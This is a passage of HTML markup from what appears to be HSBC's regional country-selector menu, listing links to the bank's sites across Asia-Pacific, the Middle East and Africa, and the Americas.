                                <a href="http://www.hsbc.com.my/1/2/HSBC-Bank-Malaysia-Berhad" title="Malaysia" class="my" lang="en-GB">Malaysia</a></li>
                            <li>
                                <a href="http://www.hsbc.lk/1/2/home-page/male-branch" title="Maldives" class="mv" lang="en-GB">Maldives</a></li>
                            <li class="last">
                                <a href="http://www.hsbc.co.nz/1/2/home" title="New Zealand" class="nz" lang="en-NZ">New
                            Zealand</a></li>
                        </ul>
                        <ul class="nav">
                            <li>
                                <a href="http://www.hsbc.com.pk/1/2/home" title="Pakistan" class="pk" lang="en-GB">Pakistan</a></li>
                            <li>
                                <a href="http://www.hsbc.com.ph/1/2/home" title="Philippines" class="ph" lang="en-PH">Philippines</a></li>
                            <li>
                                <a href="http://www.hsbc.com.sg/1/2/home" title="Singapore" class="sg" lang="en-GB">Singapore</a></li>
                            <li>
                                <a href="http://www.hsbc.lk/1/2/home-page" title="Sri Lanka" class="lk" lang="en-GB">Sri Lanka</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.tw/1/2/home_en" title="Taiwan" class="tw" lang="en-GB">Taiwan</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.com.tw/1/2/home_zh_TW" title="台灣" lang="zh-TW">台灣</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.co.th/1/2/home-en" title="Thailand" class="th" lang="en-GB">Thailand</a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.co.th/1/2/home-th" title="ประเทศไทย" lang="th-TH">ประเทศไทย</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.vn/1/2/home_en" title="Vietnam" class="vn" lang="en-GB">Vietnam</a></li>
                            <li class="last multiBottom">
                                <a href="http://www.hsbc.com.vn/1/2/home" title="Việt Nam" lang="vi-VN">Việt Nam</a></li>
                        </ul>
                    </div>
                </div>
                <div aria-hidden="true" class="region" id="middleEastMenu" style=" display: none;" role="tabpanel" aria-labelledby="middleEastTab">
                    <h2 style=" display: none;">
                Middle East &amp; Africa</h2>
                    <div class="navList">
                        <ul class="nav">
                            <li>
                                <a href="http://www.algeria.hsbc.com/hsbcdz" title="Algeria" class="dz" lang="fr-FR">Algeria</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.bh/1/2/home" title="Bahrain (Conventional Banking)" class="bh" lang="en-GB">Bahrain
                            <span>(Conventional)</span></a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.com.bh/1/2/islamic-financial-solutions" title="Bahrain (Islamic Amanah Banking)" lang="en-GB">Bahrain
                            <span>(Islamic Amanah)</span></a></li>
                            <li>
                                <a href="http://www.hsbc.com.eg/1/2/" title="Egypt" class="eg" lang="en-GB">Egypt</a></li>
                            <li>
                                <a href="http://www.hsbc.jo/1/2/home" title="Jordan" class="jo" lang="en-GB">Jordan</a></li>
                            <li>
                                <a href="http://www.kuwait.hsbc.com/1/2/kuwait" title="Kuwait" class="kw" lang="en-GB">Kuwait</a></li>
                            <li>
                                <a href="http://www.hsbc.com.lb/1/2/home" title="Lebanon" class="lb" lang="en-GB">Lebanon</a></li>
                            <li class="last">
                                <a href="http://www.hsbc.co.mu/1/2/home" title="Mauritius" class="mu" lang="en-GB">Mauritius</a></li>
                        </ul>
                        <ul class="nav">
                            <li>
                                <a href="http://www.hsbc.co.om/1/2/home" title="Oman" class="om" lang="en-GB">Oman</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.qa/1/2/ALL_SITE_PAGES/home" title="Qatar (Conventional Banking)" class="qa" lang="en-GB">Qatar
                            <span>(Conventional)</span></a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.com.qa/1/2/ALL_SITE_PAGES/hsbc-amanah" title="Qatar (Islamic Amanah Banking)" lang="en-GB">Qatar
                            <span>(Islamic Amanah)</span></a></li>
                            <li>
                                <a href="http://www.sabb.com/1/2/sabb-en/home" title="Saudi Arabia" class="sa" lang="en-GB">Saudi
                            Arabia</a></li>
                            <li>
                                <a href="http://www.sabb.com/1/2/sabb-ar/home" title="السعودية" lang="ar-SA">السعودية</a></li>
                            <li>
                                <a href="http://www.hsbc.co.za/" title="South Africa" class="za" lang="en-ZA">South Africa</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.ae/1/2/personal" title="United Arab Emirates (Conventional Banking)" class="ae" lang="en-GB">United
                            Arab Emirates <span>(Conventional)</span></a></li>
                            <li class="last multiBottom">
                                <a href="http://www.hsbc.ae/1/2/amanah-personal" title="United Arab Emirates (Islamic Amanah Banking)" lang="en-GB">United
                            Arab Emirates <span>(Islamic Amanah)</span></a></li>
                        </ul>
                    </div>
                </div>
                <div aria-hidden="true" class="region" id="americasMenu" style=" display: none;" role="tabpanel" aria-labelledby="americasTab">
                    <h2 style=" display: none;">
                Americas</h2>
                    <div class="navList">
                        <ul class="nav">
                            <li>
                                <a href="http://www.hsbc.com.ar/ar/hsbcgrupo/" title="Argentina" class="ar" lang="es-AR">Argentina</a></li>
                            <li>
                                <a href="http://www.hsbc.bm/1/2/bermuda/home" title="Bermuda" class="bm" lang="en-US">Bermuda</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.br/1/2/portal/en/personal/international-services" title="Brazil (English)" class="br" lang="en-US">Brazil <span>(English)</span></a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.com.br/1/2/portal/pt/pagina-inicial" title="Brasil (Português)" lang="pt-BR">Brasil
                            <span>(Português)</span></a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.ca/1/2/en/home/home" title="Canada (English)" class="ca" lang="en-CA">Canada
                            <span>(English)</span></a></li>
                            <li class="multiMiddle">
                                <a href="http://www.hsbc.ca/1/2/fr/home/home" title="Canada (Français)" lang="fr-CA">Canada
                            <span>(Français)</span></a></li>
                            <li class="multiMiddle">
                                <a href="http://www.hsbc.ca/1/2/tw/home/home" title="加拿大（繁體中文）" lang="zh-HK">加拿大<span>（繁體中文）</span></a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.ca/1/2/cn/home/home" title="加拿大（简体中文）" lang="zh-CN">加拿大<span>（简体中文）</span></a></li>
                            <li class="last">
                                <a href="http://www.hsbc.ky/1/2/cayman/home" title="Cayman Islands" class="ky" lang="en-US">Cayman
                            Islands</a></li>
                        </ul>
                        <ul class="nav">
                            <li class="multiTop">
                                <a href="http://www.hsbc.cl/1/2/en/home" title="Chile (English)" class="cl" lang="en-US">Chile
                            <span>(English)</span></a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.cl/1/2/es/home" title="Chile (Español)" lang="es-CL">Chile <span>(Español)</span></a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.co/1/2/en/home" title="Colombia (English)" class="co" lang="en-US">Colombia
                            <span>(English)</span></a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.com.co/1/2/es/home" title="Colombia (Español)" lang="es-CO">Colombia
                            <span>(Español)</span></a></li>
                            <li>
                                <a href="http://www.hsbc.fi.cr/" title="Costa Rica" class="cr" lang="es-CR">Costa Rica</a></li>
                            <li>
                                <a href="http://www.hsbc.com.sv/" title="El Salvador" class="sv" lang="es-SV">El Salvador</a></li>
                            <li>
                                <a href="http://www.hsbc.com.hn/es/index.asp" title="Honduras" class="hn" lang="es-HN">Honduras</a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.mx/1/2/en/home" title="Mexico (English)" class="mx" lang="en-US">Mexico
                            <span>(English)</span></a></li>
                            <li class="last multiBottom">
                                <a href="http://www.hsbc.com.mx/1/2/es/home" title="México (Español)" lang="es-MX">México <span>(Español)</span></a></li>
                        </ul>
                        <ul class="nav">
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.pa/1/2/en/home" title="Panama (English)" class="pa" lang="en-US">Panama
                            <span>(English)</span></a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.com.pa/1/2/es/home" title="Panamá (Español)" lang="es-PA">Panamá <span>(Español)</span></a></li>
                            <li class="multiTop">
                                <a href="http://www.hsbc.com.py/" title="Paraguay (English)" class="py" lang="en-US">Paraguay
                            <span>(English)</span></a></li>
                            <li class="multiBottom">
                                <a href="http://www.hsbc.com.py/" title="Paraguay (Español)" lang="es-PY">Paraguay <span>(Español)</span></a></li>
                            <li>
                                <a href="http://www.hsbc.com.pe/1/2/es/home" title="Perú" class="pe" lang="es-PE">Perú</a></li>
                            <li>
                                <a href="http://www.us.hsbc.com/" title="United States" class="us" lang="en-US">United States</a></li>
                            <li class="last">
                                <a href="http://www.hsbc.com.uy/" title="Uruguay" class="uy" lang="es-UY">Uruguay</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        
        
    </div>
    

</body>

</html>